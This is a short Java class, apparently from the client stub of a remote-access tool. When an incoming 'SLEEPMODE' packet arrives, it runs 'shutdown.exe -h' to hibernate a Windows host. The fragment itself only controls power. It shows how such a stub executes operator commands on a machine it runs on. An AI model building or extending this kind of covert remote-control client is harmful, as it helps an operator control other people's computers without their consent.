package com.redpois0n.stub.packets.incoming;

public class PacketSLEEPMODE extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String operatingSystem = System.getProperty("os.name");
		if (operatingSystem.toLowerCase().contains("windows")) {
			Runtime.getRuntime().exec("shutdown.exe -h");
		}
	}

}
